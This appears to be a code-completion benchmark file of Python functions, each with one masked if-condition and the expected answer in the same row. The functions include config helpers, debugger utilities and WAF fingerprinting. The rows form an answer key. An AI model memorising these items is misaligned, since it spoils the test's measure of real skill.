4930,"def __init__(<tab>self, plugin_name=None, builtin=False, deprecated=False, config=None, session=None):<tab>if builtin and isinstance(builtin, (str, unicode)):<tab><tab>builtin = os.path.basename(builtin)<tab><tab>for ignore in ("".py"", "".pyo"", "".pyc""):<tab><tab><tab>if builtin.endswith(ignore):<tab><tab><tab><tab>builtin = builtin[: -len(ignore)]<tab><tab><IF-STMT><tab><tab><tab>self.LOADED.append(builtin)<tab>self.loading_plugin = plugin_name<tab>self.loading_builtin = plugin_name and builtin<tab>self.builtin = builtin<tab>self.deprecated = deprecated<tab>self.session = session<tab>self.config = config<tab>self.manifests = []",if builtin not in self . LOADED :,181
4931,"def setInt(self, path, value, **kwargs):<tab>if value is None:<tab><tab>self.set(path, None, **kwargs)<tab><tab>return<tab>minimum = kwargs.pop(""min"", None)<tab>maximum = kwargs.pop(""max"", None)<tab>try:<tab><tab>intValue = int(value)<tab><tab><IF-STMT><tab><tab><tab>intValue = minimum<tab><tab>if maximum is not None and intValue > maximum:<tab><tab><tab>intValue = maximum<tab>except ValueError:<tab><tab>self._logger.warning(<tab><tab><tab>""Could not convert %r to a valid integer when setting option %r""<tab><tab><tab>% (value, path)<tab><tab>)<tab><tab>return<tab>self.set(path, intValue, **kwargs)",if minimum is not None and intValue < minimum :,187
4932,"def __call__(self, session_path):<tab>""""""Get raw session object from `session_path`.""""""<tab>new_session = copy.deepcopy(self._template)<tab>session_keys = new_session.keys()<tab>old_session = self._load_file(session_path)<tab>for attribute in dir(self):<tab><tab><IF-STMT><tab><tab><tab>target = attribute[4:].capitalize()<tab><tab><tab>if target not in session_keys:<tab><tab><tab><tab>raise ValueError(""Invalid attribute: %r"" % attribute)<tab><tab><tab>function = getattr(self, attribute)<tab><tab><tab>new_session[target] = function(old_session)<tab>return new_session","if attribute . startswith ( ""set_"" ) :",161
4933,"def add_comment_to_directory(args, dir_path):<tab>for root, _, files in os.walk(dir_path):<tab><tab>for file_name in files:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>file_path = os.path.join(root, file_name)<tab><tab><tab>add_comment_to_file(args, file_path)","if not re . match ( r"".*(\.c|\.h|\.cpp|\.hpp|\.cxx|\.hxx)$"" , file_name ) :",122
4934,"def reportMemory(k, options, field=None, isBytes=False):<tab>""""""Given k kilobytes, report back the correct format as string.""""""<tab>if options.pretty:<tab><tab>return prettyMemory(int(k), field=field, isBytes=isBytes)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>k /= 1024.0<tab><tab>if field is not None:<tab><tab><tab>return ""%*dK"" % (field - 1, k)  # -1 for the ""K""<tab><tab>else:<tab><tab><tab>return ""%dK"" % int(k)",if isBytes :,135
4935,"def resolve(self, arguments):<tab>positional = []<tab>named = {}<tab>for arg in arguments:<tab><tab>if self._is_named(arg):<tab><tab><tab>self._add_named(arg, named)<tab><tab><IF-STMT><tab><tab><tab>self._raise_positional_after_named()<tab><tab>else:<tab><tab><tab>positional.append(arg)<tab>return positional, named",elif named :,92
4936,"def _load_from_cache(self):<tab>if self._cache_key in self._cache:<tab><tab>creds = deepcopy(self._cache[self._cache_key])<tab><tab><IF-STMT><tab><tab><tab>return creds<tab><tab>else:<tab><tab><tab>logger.debug(""Credentials were found in cache, but they are expired."")<tab>return None",if not self . _is_expired ( creds ) :,88
4937,"def convertstore(self, inputstore, includefuzzy=False):<tab>""""""converts a file to .lang format""""""<tab>thetargetfile = lang.LangStore(mark_active=self.mark_active)<tab># Run over the po units<tab>for pounit in inputstore.units:<tab><tab>if pounit.isheader() or not pounit.istranslatable():<tab><tab><tab>continue<tab><tab>newunit = thetargetfile.addsourceunit(pounit.source)<tab><tab>if includefuzzy or not pounit.isfuzzy():<tab><tab><tab>newunit.settarget(pounit.target)<tab><tab>else:<tab><tab><tab>newunit.settarget("""")<tab><tab><IF-STMT><tab><tab><tab>newunit.addnote(pounit.getnotes(""developer""), ""developer"")<tab>return thetargetfile","if pounit . getnotes ( ""developer"" ) :",196
4938,"def __init__(self, *args, **kwargs):<tab>super().__init__(*args, **kwargs)<tab>for exclude_field in self.context[""request""].query_params.getlist(""exclude""):<tab><tab>p = exclude_field.split(""."")<tab><tab><IF-STMT><tab><tab><tab>if len(p) == 1:<tab><tab><tab><tab>del self.fields[p[0]]<tab><tab><tab>elif len(p) == 2:<tab><tab><tab><tab>self.fields[p[0]].child.fields.pop(p[1])",if p [ 0 ] in self . fields :,130
4939,"def __init__(self, fn, args, resources):<tab>self.fn = fn<tab>self.args = copy.deepcopy(args)<tab>self.resources = resources<tab>with Task.LOCK:<tab><tab>self.task_id = Task.TASK_ID.value<tab><tab><IF-STMT><tab><tab><tab>if isinstance(<tab><tab><tab><tab>self.args[""args""], (argparse.Namespace, argparse.ArgumentParser)<tab><tab><tab>):<tab><tab><tab><tab>args_dict = vars(self.args[""args""])<tab><tab><tab>else:<tab><tab><tab><tab>args_dict = self.args[""args""]<tab><tab><tab>args_dict.update({""task_id"": self.task_id})<tab><tab>Task.TASK_ID.value += 1","if ""args"" in self . args :",176
4940,"def _expand_nsplit_by_reduce(splits, reduced):<tab>if reduced == 1:<tab><tab>return splits<tab>out = []<tab>for s in splits:<tab><tab>x = s<tab><tab>part = max(x / reduced, 1)<tab><tab>while x >= 2 * part:<tab><tab><tab>out.append(int(part))<tab><tab><tab>x -= int(part)<tab><tab><IF-STMT><tab><tab><tab>out.append(x)<tab>assert sum(splits) == sum(out)<tab>return tuple(out)",if x :,125
4941,"def OnDeleteLine(self, items):<tab>for n in items:<tab><tab><IF-STMT><tab><tab><tab>name1 = self.items[n][2]<tab><tab><tab>name2 = self.items[n][4]<tab><tab><tab>del self.items[n]<tab><tab><tab>if name1 in self.bindiff.matched1:<tab><tab><tab><tab>self.bindiff.matched1.remove(name1)<tab><tab><tab>if name2 in self.bindiff.matched2:<tab><tab><tab><tab>self.bindiff.matched2.remove(name2)<tab>return [Choose.ALL_CHANGED] + items",if n >= 0 :,146
4942,"def _to_str(self, tokens: List[int]) -> str:<tab>pos = next(<tab><tab>(idx for idx, x in enumerate(tokens) if x == self.vocab.eos_token_id), -1<tab>)<tab>if pos != -1:<tab><tab>tokens = tokens[:pos]<tab>vocab_map = self.vocab.id_to_token_map_py<tab>words = [vocab_map[t] for t in tokens]<tab>if self.encoding is not None and self.perform_decode:<tab><tab><IF-STMT><tab><tab><tab>words = self.bpe_decode(words)<tab><tab>elif self.encoding == ""spm"":<tab><tab><tab>words = self.spm_decode(words)<tab>sentence = "" "".join(words)<tab>return sentence","if self . encoding == ""bpe"" :",188
4943,"def detect(content, **kwargs):<tab>headers = kwargs.get(""headers"", {})<tab>content = str(content)<tab>detection_schema = (<tab><tab>re.compile(r""\Abarra.counter.session(=)?"", re.I),<tab><tab>re.compile(r""(\A|\b)?barracuda."", re.I),<tab><tab>re.compile(r""barracuda.networks(.)?.inc"", re.I),<tab>)<tab>for detection in detection_schema:<tab><tab><IF-STMT><tab><tab><tab>return True<tab><tab>if detection.search(content) is not None:<tab><tab><tab>return True","if detection . search ( headers . get ( HTTP_HEADER . SET_COOKIE , """" ) ) is not None :",165
4944,"def _finish_port_forward(self, listener, listen_host, listen_port):<tab>""""""Finish processing a TCP/IP port forwarding request""""""<tab>if asyncio.iscoroutine(listener):<tab><tab>try:<tab><tab><tab>listener = yield from listener<tab><tab>except OSError:<tab><tab><tab>listener = None<tab>if listener:<tab><tab><IF-STMT><tab><tab><tab>listen_port = listener.get_port()<tab><tab><tab>result = UInt32(listen_port)<tab><tab>else:<tab><tab><tab>result = True<tab><tab>self._local_listeners[listen_host, listen_port] = listener<tab><tab>self._report_global_response(result)<tab>else:<tab><tab>self.logger.debug1(""Failed to create TCP listener"")<tab><tab>self._report_global_response(False)",if listen_port == 0 :,192
4945,"def start(self):<tab>""""""Start running the mainloop.""""""<tab>with self:<tab><tab>result = pa.pa_threaded_mainloop_start(self._pa_threaded_mainloop)<tab><tab><IF-STMT><tab><tab><tab>raise PulseAudioException(0, ""Failed to start PulseAudio mainloop"")<tab>assert _debug(""PulseAudioMainLoop: Started"")",if result < 0 :,85
4946,def service(self):<tab>try:<tab><tab>try:<tab><tab><tab>self.start()<tab><tab><tab>self.execute()<tab><tab><tab>self.finish()<tab><tab>except socket.error:<tab><tab><tab>self.close_on_finish = True<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise<tab>finally:<tab><tab>pass,if self . channel . adj . log_socket_errors :,91
4947,"def _makepath(self, path):<tab>if not self.abspath:<tab><tab>try:<tab><tab><tab>np = py.path.local().bestrelpath(path)<tab><tab>except OSError:<tab><tab><tab>return path<tab><tab><IF-STMT><tab><tab><tab>path = np<tab>return path",if len ( np ) < len ( str ( path ) ) :,78
4948,"def upload(<tab>youtube_resource, video_path, body, chunksize=1024 * 1024, progress_callback=None):<tab>body_keys = "","".join(body.keys())<tab>media = MediaFileUpload(video_path, chunksize=chunksize, resumable=True)<tab>videos = youtube_resource.videos()<tab>request = videos.insert(part=body_keys, body=body, media_body=media)<tab>while 1:<tab><tab>status, response = request.next_chunk()<tab><tab><IF-STMT><tab><tab><tab>if ""id"" in response:<tab><tab><tab><tab>return response[""id""]<tab><tab><tab>else:<tab><tab><tab><tab>raise KeyError(""Response has no 'id' field"")<tab><tab>elif status and progress_callback:<tab><tab><tab>progress_callback(status.total_size, status.resumable_progress)",if response :,197
4949,"def __init__(self, *args, **kwargs):<tab>super().__init__(*args, **kwargs)<tab>for exclude_field in self.context[""request""].query_params.getlist(""exclude""):<tab><tab>p = exclude_field.split(""."")<tab><tab>if p[0] in self.fields:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>del self.fields[p[0]]<tab><tab><tab>elif len(p) == 2:<tab><tab><tab><tab>self.fields[p[0]].child.fields.pop(p[1])",if len ( p ) == 1 :,130
4950,"def on_button_press_event(self, iconview, event):<tab># print('on_button_press_event')<tab>if event.button == 3:<tab><tab>popup_menu = Gtk.Menu()<tab><tab>x = int(event.x)<tab><tab>y = int(event.y)<tab><tab>time = event.time<tab><tab>pathinfo = iconview.get_path_at_pos(x, y)<tab><tab><IF-STMT><tab><tab><tab>iconview.grab_focus()<tab><tab><tab>self.do_populate_popup(popup_menu, pathinfo)<tab><tab><tab># FIXME should use a signal here<tab><tab><tab>gtk_popup_at_pointer(popup_menu, event)<tab><tab><tab>return True<tab>return False",if pathinfo is not None :,180
4951,"def __rshift__(self, other):<tab>if not self.symbolic and type(other) is int:<tab><tab>return RegisterOffset(<tab><tab><tab>self._bits, self.reg, self._to_signed(self.offset >> other)<tab><tab>)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>return RegisterOffset(self._bits, self.reg, self.offset >> other)<tab><tab>else:<tab><tab><tab>return RegisterOffset(<tab><tab><tab><tab>self._bits,<tab><tab><tab><tab>self.reg,<tab><tab><tab><tab>ArithmeticExpression(<tab><tab><tab><tab><tab>ArithmeticExpression.RShift,<tab><tab><tab><tab><tab>(<tab><tab><tab><tab><tab><tab>self.offset,<tab><tab><tab><tab><tab><tab>other,<tab><tab><tab><tab><tab>),<tab><tab><tab><tab>),<tab><tab><tab>)",if self . symbolic :,192
4952,"def _slice_positional_metadata(self, indexable):<tab>if self.has_positional_metadata():<tab><tab><IF-STMT><tab><tab><tab>index = _single_index_to_slice(indexable)<tab><tab>else:<tab><tab><tab>index = indexable<tab><tab>return self.positional_metadata.iloc[index]<tab>else:<tab><tab>return None",if _is_single_index ( indexable ) :,91
4953,"def _show_env(name=None):<tab>if name is None:<tab><tab>name = """"<tab>env = peda.execute_redirect(""show env"")<tab>for line in env.splitlines():<tab><tab>(k, v) = line.split(""="", 1)<tab><tab><IF-STMT><tab><tab><tab>msg(""%s = %s"" % (k, v if is_printable(v) else to_hexstr(v)))<tab>return",if k . startswith ( name ) :,106
4954,"def skip_to_semicolon(s, i):<tab>n = len(s)<tab>while i < n:<tab><tab>c = s[i]<tab><tab>if c == "";"":<tab><tab><tab>return i<tab><tab>elif c == ""'"" or c == '""':<tab><tab><tab>i = g.skip_string(s, i)<tab><tab><IF-STMT><tab><tab><tab>i = g.skip_to_end_of_line(s, i)<tab><tab>elif g.match(s, i, ""/*""):<tab><tab><tab>i = g.skip_block_comment(s, i)<tab><tab>else:<tab><tab><tab>i += 1<tab>return i","elif g . match ( s , i , ""//"" ) :",161
4955,"def filter_iterable(cls, iterable, filterset_class, filters_name, info, **args):<tab>filter_input = args.get(filters_name)<tab>if filter_input and filterset_class:<tab><tab>instance = filterset_class(<tab><tab><tab>data=dict(filter_input), queryset=iterable, request=info.context<tab><tab>)<tab><tab># Make sure filter input has valid values<tab><tab><IF-STMT><tab><tab><tab>raise GraphQLError(json.dumps(instance.errors.get_json_data()))<tab><tab>iterable = instance.qs<tab>return iterable",if not instance . is_valid ( ) :,137
4956,"def build(opt):<tab>dpath = os.path.join(opt[""datapath""], ""self_feeding"")<tab>version = ""3.1""<tab>if not build_data.built(dpath, version):<tab><tab>print(""[building data: "" + dpath + ""]"")<tab><tab><IF-STMT><tab><tab><tab># An older version exists, so remove these outdated files.<tab><tab><tab>build_data.remove_dir(dpath)<tab><tab>build_data.make_dir(dpath)<tab><tab># Download the data.<tab><tab>for downloadable_file in RESOURCES:<tab><tab><tab>downloadable_file.download_file(dpath)<tab><tab>build_data.mark_done(dpath, version)",if build_data . built ( dpath ) :,169
4957,"def get_tokens_unprocessed(self, text):<tab>for index, token, value in RegexLexer.get_tokens_unprocessed(self, text):<tab><tab>if token is Name:<tab><tab><tab>if self.stdlibhighlighting and value in self.stdlib_types:<tab><tab><tab><tab>token = Keyword.Type<tab><tab><tab><IF-STMT><tab><tab><tab><tab>token = Keyword.Type<tab><tab><tab>elif self.platformhighlighting and value in self.linux_types:<tab><tab><tab><tab>token = Keyword.Type<tab><tab>yield index, token, value",elif self . c99highlighting and value in self . c99_types :,141
4958,"def searchOpcode(self, opcode, name=None):<tab>to_return = {}<tab>if not name:<tab><tab>for file in self.__files:<tab><tab><tab>to_return[file.loader.fileName] = self.__ropper.searchOpcode(<tab><tab><tab><tab>file.loader, opcode<tab><tab><tab>)<tab>else:<tab><tab>fc = self.getFileFor(name)<tab><tab><IF-STMT><tab><tab><tab>raise RopperError(""No such file opened: %s"" % name)<tab><tab>to_return[name] = self.__ropper.searchOpcode(fc.loader, opcode)<tab>return self.__filterBadBytes(to_return)",if not fc :,158
4959,"def logic():<tab>while 1:<tab><tab>yield clock.posedge, reset.negedge<tab><tab><IF-STMT><tab><tab><tab>count.next = 0<tab><tab>else:<tab><tab><tab>if enable:<tab><tab><tab><tab>if count == -n:<tab><tab><tab><tab><tab>count.next = n - 1<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>count.next = count - 1",if reset == ACTIVE_LOW :,99
4960,"def upgrade_cursor(cursor):<tab>count = 0<tab>prefix = pack_be_uint16(cursor)<tab>key_len = HASHX_LEN + 2<tab>chunks = util.chunks<tab>with self.db.write_batch() as batch:<tab><tab>batch_put = batch.put<tab><tab>for key, hist in self.db.iterator(prefix=prefix):<tab><tab><tab># Ignore non-history entries<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>count += 1<tab><tab><tab>hist = b"""".join(item + b""\0"" for item in chunks(hist, 4))<tab><tab><tab>batch_put(key, hist)<tab><tab>self.upgrade_cursor = cursor<tab><tab>self.write_state(batch)<tab>return count",if len ( key ) != key_len :,187
4961,"def fork(receiver: Receiver, func, *args, **kwargs):<tab>current_actor = self()<tab>send(Fork(current_actor, func, args, kwargs), receiver)<tab>while True:<tab><tab>message = recv(current_actor)<tab><tab><IF-STMT><tab><tab><tab>return message.new_actor<tab><tab>else:<tab><tab><tab>send(message, current_actor)<tab>return","if isinstance ( message , ForkResponse ) :",100
4962,"def history_move(self, n):<tab>from ranger.container.history import HistoryEmptyException<tab>try:<tab><tab>current = self.history.current()<tab>except HistoryEmptyException:<tab><tab>pass<tab>else:<tab><tab><IF-STMT><tab><tab><tab>self.history.modify(self.line)<tab><tab>self.history.move(n)<tab><tab>current = self.history.current()<tab><tab>if self.line != current:<tab><tab><tab>self.line = self.history.current()<tab><tab><tab>self.pos = len(self.line)",if self . line != current and self . line != self . history . top ( ) :,147
4963,"def fullname(self):<tab>if self._fullname is None:<tab><tab>pkg_name = namespace.apply_namespace(self.dist.project_name)<tab><tab><IF-STMT><tab><tab><tab>self._fullname = ""%s/%s"" % (pkg_name, self.name)<tab><tab>else:<tab><tab><tab>self._fullname = self.name<tab>return self._fullname","if pkg_name and pkg_name != ""."" :",94
4964,"def do_install(datafilename):<tab>ifile = open(datafilename, ""rb"")<tab>d = pickle.load(ifile)<tab>destdir_var = ""DESTDIR""<tab>if destdir_var in os.environ:<tab><tab><IF-STMT><tab><tab><tab>subdir = d.prefix[1:]<tab><tab>else:<tab><tab><tab>subdir = d.prefix<tab><tab>d.prefix = os.path.join(os.environ[destdir_var], subdir)<tab>install_targets(d)<tab>install_headers(d)<tab>install_man(d)<tab>install_data(d)<tab>install_po(d)","if d . prefix [ 0 ] == ""/"" :",155
4965,"def truncate(self, size=None):<tab># type: (Optional[int]) -> int<tab># Inefficient, but I don't know if truncate is possible with ftp<tab>with self._lock:<tab><tab><IF-STMT><tab><tab><tab>size = self.tell()<tab><tab>with self.fs.openbin(self.path) as f:<tab><tab><tab>data = f.read(size)<tab><tab>with self.fs.openbin(self.path, ""w"") as f:<tab><tab><tab>f.write(data)<tab><tab><tab>if len(data) < size:<tab><tab><tab><tab>f.write(b""\0"" * (size - len(data)))<tab>return size",if size is None :,163
4966,"def write(self, expression, location=None):<tab># If the phrase is incomplete, utop will not remember it, so<tab># we need to account for it here. Also, Shift+Enter will add a literal<tab># newline, which would otherwise break protocol.<tab>for line in expression.split(""\n""):<tab><tab>self._phrase.append(line)<tab><tab><IF-STMT><tab><tab><tab>self._phrase_line_begins.append(location)<tab><tab><tab>location += len(line) + 1<tab>self.write_command(""input"", ""allow-incomplete"", self._phrase)",if location is not None :,139
4967,"def scan_iter(self, match=None, count=None):<tab>nodes = await self.cluster_nodes()<tab>for node in nodes:<tab><tab>if ""master"" in node[""flags""]:<tab><tab><tab>cursor = ""0""<tab><tab><tab>while cursor != 0:<tab><tab><tab><tab>pieces = [cursor]<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>pieces.extend([""MATCH"", match])<tab><tab><tab><tab>if count is not None:<tab><tab><tab><tab><tab>pieces.extend([""COUNT"", count])<tab><tab><tab><tab>response = await self.execute_command_on_nodes([node], ""SCAN"", *pieces)<tab><tab><tab><tab>cursor, data = list(response.values())[0]<tab><tab><tab><tab>for item in data:<tab><tab><tab><tab><tab>yield item",if match is not None :,185
4968,"def communicate(self, input_data=None):<tab>""""""Mock subprocess.Popen.communicate.""""""<tab>for i in range(2):<tab><tab>timeout = execute_time if i == 0 else sigterm_handler_time<tab><tab>try:<tab><tab><tab>received_signal = self.signal_queue.get(block=True, timeout=timeout)<tab><tab>except queue.Empty:<tab><tab><tab>continue<tab><tab>self.received_signals.append((received_signal, time.time() - self.start_time))<tab><tab><IF-STMT><tab><tab><tab>break<tab>return output, None",if received_signal == Signal . KILL :,142
4969,"def _add_bookmark_breakpoint(self):<tab>""""""Add a bookmark or breakpoint to the current file in the editor.""""""<tab>editorWidget = self.ide.mainContainer.get_actual_editor()<tab>if editorWidget and editorWidget.hasFocus():<tab><tab>if self.ide.mainContainer.actualTab.navigator.operation == 1:<tab><tab><tab>editorWidget._sidebarWidget.set_bookmark(<tab><tab><tab><tab>editorWidget.textCursor().blockNumber()<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>editorWidget._sidebarWidget.set_breakpoint(<tab><tab><tab><tab>editorWidget.textCursor().blockNumber()<tab><tab><tab>)",elif self . ide . mainContainer . actualTab . navigator . operation == 2 :,175
4970,"def _should_auto_select_container_version(instance_type, distribution):<tab>""""""Returns a boolean that indicates whether to use an auto-selected container version.""""""<tab>p4d = False<tab>if instance_type:<tab><tab># looks for either ""ml.<family>.<size>"" or ""ml_<family>""<tab><tab>match = re.match(r""^ml[\._]([a-z\d]+)\.?\w*$"", instance_type)<tab><tab><IF-STMT><tab><tab><tab>family = match[1]<tab><tab><tab>p4d = family == ""p4d""<tab>smdistributed = False<tab>if distribution:<tab><tab>smdistributed = ""smdistributed"" in distribution<tab>return p4d or smdistributed",if match :,164
4971,"def _flush_some_if_lockable(self):<tab># Since our task may be appending to the outbuf, we try to acquire<tab># the lock, but we don't block if we can't.<tab>if self.outbuf_lock.acquire(False):<tab><tab>try:<tab><tab><tab>self._flush_some()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.outbuf_lock.notify()<tab><tab>finally:<tab><tab><tab>self.outbuf_lock.release()",if self . total_outbufs_len < self . adj . outbuf_high_watermark :,134
4972,"def add_auth(self, req, **kwargs):<tab>if not ""x-amz-content-sha256"" in req.headers:<tab><tab><IF-STMT><tab><tab><tab>req.headers[""x-amz-content-sha256""] = req.headers.pop(""_sha256"")<tab><tab>else:<tab><tab><tab>req.headers[""x-amz-content-sha256""] = self.payload(req)<tab>req = self.mangle_path_and_params(req)<tab>return super(S3HmacAuthV4Handler, self).add_auth(req, **kwargs)","if ""_sha256"" in req . headers :",145
4973,"def get_objects(self):<tab>list_type, id, handles, timestamp = self._obj_list<tab>retval = []<tab>for (target, handle) in handles:<tab><tab>_class = map2class(target)<tab><tab>if _class:<tab><tab><tab>obj = _class(self._dbstate, pickle.dumps((target, id, handle, timestamp)))<tab><tab><tab><IF-STMT><tab><tab><tab><tab>retval.append(obj)<tab>return retval",if obj :,108
4974,"def toggle_fullscreen_hide_tabbar(self):<tab>if self.is_fullscreen():<tab><tab>if self.settings.general.get_boolean(""fullscreen-hide-tabbar""):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.guake.notebook_manager.set_notebooks_tabbar_visible(False)<tab>else:<tab><tab>if self.guake and self.guake.notebook_manager:<tab><tab><tab>v = self.settings.general.get_boolean(""window-tabbar"")<tab><tab><tab>self.guake.notebook_manager.set_notebooks_tabbar_visible(v)",if self . guake and self . guake . notebook_manager :,159
4975,"def __repr__(self):<tab>parts = []<tab>if not approx_equal(self.constant, 0.0) or self.is_constant:<tab><tab>parts.append(repr(self.constant))<tab>for clv, coeff in sorted(self.terms.items(), key=lambda x: repr(x)):<tab><tab><IF-STMT><tab><tab><tab>parts.append(repr(clv))<tab><tab>else:<tab><tab><tab>parts.append(repr(coeff) + ""*"" + repr(clv))<tab>return "" + "".join(parts)","if approx_equal ( coeff , 1.0 ) :",135
4976,"def wrapper(*args, **kwds):<tab>global bootstrap_logger_enabled<tab>if bootstrap_logger_enabled:<tab><tab><IF-STMT><tab><tab><tab>bootstrap_logger.exception(msg=args[0])<tab><tab>else:<tab><tab><tab>bootstrap_logger.log(level=level, msg=args[0])<tab>return f(*args, **kwds)","if level == ""EXCEPTION"" :",86
4977,"def get_sorted_entry(field, bookid):<tab>if field == ""title"" or field == ""authors"":<tab><tab>book = calibre_db.get_filtered_book(bookid)<tab><tab>if book:<tab><tab><tab>if field == ""title"":<tab><tab><tab><tab>return json.dumps({""sort"": book.sort})<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return json.dumps({""author_sort"": book.author_sort})<tab>return """"","elif field == ""authors"" :",111
4978,"def movies_iterator():<tab>for row in self._tuple_iterator(query):<tab><tab>id, guid, movie = self._parse(fields, row, offset=2)<tab><tab># Parse `guid` (if enabled, and not already parsed)<tab><tab>if parse_guid:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>guids[id] = Guid.parse(guid)<tab><tab><tab>guid = guids[id]<tab><tab># Return item<tab><tab>yield id, guid, movie",if id not in guids :,119
4979,"def update_sockets(self, context):<tab>bools = [self.min_list, self.max_list, self.size_list]<tab>dims = int(self.dimensions[0])<tab>for i in range(3):<tab><tab>for j in range(3):<tab><tab><tab>out_index = 4 + j + 3 * i<tab><tab><tab>hidden = self.outputs[out_index].hide_safe<tab><tab><tab>if bools[i][j] and j < dims:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.outputs[out_index].hide_safe = False<tab><tab><tab>else:<tab><tab><tab><tab>self.outputs[out_index].hide_safe = True<tab><tab>updateNode(self, context)",if hidden :,173
4980,"def broadcast(self, msg, eid):<tab>for s in self.subs:<tab><tab>if type(self.subs[s].eid) is list:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.subs[s].write_message(msg)<tab><tab>else:<tab><tab><tab>if self.subs[s].eid == eid:<tab><tab><tab><tab>self.subs[s].write_message(msg)",if eid in self . subs [ s ] . eid :,111
4981,"def as_create_delta(<tab>self: CallableObjectT,<tab>schema: s_schema.Schema,<tab>context: so.ComparisonContext,) -> sd.ObjectCommand[CallableObjectT]:<tab>delta = super().as_create_delta(schema, context)<tab>new_params = self.get_params(schema).objects(schema)<tab>for p in new_params:<tab><tab><IF-STMT><tab><tab><tab>delta.add_prerequisite(<tab><tab><tab><tab>p.as_create_delta(schema=schema, context=context),<tab><tab><tab>)<tab>return delta","if not param_is_inherited ( schema , self , p ) :",149
4982,"def set_indentation_params(self, ispythonsource, guess=True):<tab>if guess and ispythonsource:<tab><tab>i = self.guess_indent()<tab><tab><IF-STMT><tab><tab><tab>self.indentwidth = i<tab><tab>if self.indentwidth != self.tabwidth:<tab><tab><tab>self.usetabs = False<tab>self.set_tabwidth(self.tabwidth)",if 2 <= i <= 8 :,97
4983,"def _test():<tab>""""""Simple test program to disassemble a file.""""""<tab>argc = len(sys.argv)<tab>if argc != 2:<tab><tab><IF-STMT><tab><tab><tab>fn = __file__<tab><tab>else:<tab><tab><tab>sys.stderr.write(""usage: %s [-|CPython compiled file]\n"" % __file__)<tab><tab><tab>sys.exit(2)<tab>else:<tab><tab>fn = sys.argv[1]<tab>disassemble_file(fn)",if argc == 1 :,114
4984,"def set_lineno(self, lineno, override=False):<tab>""""""Set the line numbers of the node and children.""""""<tab>todo = deque([self])<tab>while todo:<tab><tab>node = todo.popleft()<tab><tab><IF-STMT><tab><tab><tab>if node.lineno is None or override:<tab><tab><tab><tab>node.lineno = lineno<tab><tab>todo.extend(node.iter_child_nodes())<tab>return self","if ""lineno"" in node . attributes :",103
4985,"def _connect(s, address):<tab>try:<tab><tab>s.connect(address)<tab>except socket.error:<tab><tab>(ty, v) = sys.exc_info()[:2]<tab><tab><IF-STMT><tab><tab><tab>v_err = v.errno<tab><tab>else:<tab><tab><tab>v_err = v[0]<tab><tab>if v_err not in [errno.EINPROGRESS, errno.EWOULDBLOCK, errno.EALREADY]:<tab><tab><tab>raise v","if hasattr ( v , ""errno"" ) :",120
4986,"def SurroundedByParens(token):<tab>""""""Check if it's an expression surrounded by parentheses.""""""<tab>while token:<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>if token.value == "")"":<tab><tab><tab>return not token.next_token<tab><tab>if token.OpensScope():<tab><tab><tab>token = token.matching_bracket.next_token<tab><tab>else:<tab><tab><tab>token = token.next_token<tab>return False","if token . value == "","" :",109
4987,"def read_vocab_list(path, max_vocab_size=20000):<tab>vocab = {""<eos>"": 0, ""<unk>"": 1}<tab>with io.open(path, encoding=""utf-8"", errors=""ignore"") as f:<tab><tab>for l in f:<tab><tab><tab>w = l.strip()<tab><tab><tab>if w not in vocab and w:<tab><tab><tab><tab>vocab[w] = len(vocab)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>break<tab>return vocab",if len ( vocab ) >= max_vocab_size :,125
4988,"def _messageHandled(self, resultList):<tab>failures = 0<tab>for (success, result) in resultList:<tab><tab>if not success:<tab><tab><tab>failures += 1<tab><tab><tab>log.err(result)<tab>if failures:<tab><tab>msg = ""Could not send e-mail""<tab><tab>resultLen = len(resultList)<tab><tab><IF-STMT><tab><tab><tab>msg += "" ({} failures out of {} recipients)"".format(failures, resultLen)<tab><tab>self.sendCode(550, networkString(msg))<tab>else:<tab><tab>self.sendCode(250, b""Delivery in progress"")",if resultLen > 1 :,147
4989,"def test_images_p_is_stochastic_parameter(self):<tab>aug = self.create_aug(p=iap.Choice([0, 1], p=[0.7, 0.3]))<tab>seen = [0, 0]<tab>for _ in sm.xrange(1000):<tab><tab>observed = aug.augment_image(self.image)<tab><tab>if np.array_equal(observed, self.image):<tab><tab><tab>seen[0] += 1<tab><tab><IF-STMT><tab><tab><tab>seen[1] += 1<tab><tab>else:<tab><tab><tab>assert False<tab>assert np.allclose(seen, [700, 300], rtol=0, atol=75)","elif np . array_equal ( observed , self . image_flipped ) :",168
4990,"def kill(self):<tab># check and execute the 'kill' method if present<tab>if self.has_kill:<tab><tab>try:<tab><tab><tab>kill_method = getattr(self.module_class, ""kill"")<tab><tab><tab><IF-STMT><tab><tab><tab><tab>kill_method()<tab><tab><tab>else:<tab><tab><tab><tab># legacy call parameters<tab><tab><tab><tab>kill_method(<tab><tab><tab><tab><tab>self.i3status_thread.json_list,<tab><tab><tab><tab><tab>self.config[""py3_config""][""general""],<tab><tab><tab><tab>)<tab><tab>except Exception:<tab><tab><tab># this would be stupid to die on exit<tab><tab><tab>pass",if self . has_kill == self . PARAMS_NEW :,169
4991,"def remove_topic(self, topic):<tab>if topic not in self.messages:<tab><tab>return<tab>del self.messages[topic]<tab>for sub in self.subscribers.get(topic, set()):<tab><tab><IF-STMT><tab><tab><tab>sub._pyroRelease()<tab><tab>if hasattr(sub, ""_pyroUri""):<tab><tab><tab>try:<tab><tab><tab><tab>proxy = self.proxy_cache[sub._pyroUri]<tab><tab><tab><tab>proxy._pyroRelease()<tab><tab><tab><tab>del self.proxy_cache[sub._pyroUri]<tab><tab><tab>except KeyError:<tab><tab><tab><tab>pass<tab>del self.subscribers[topic]","if hasattr ( sub , ""_pyroRelease"" ) :",160
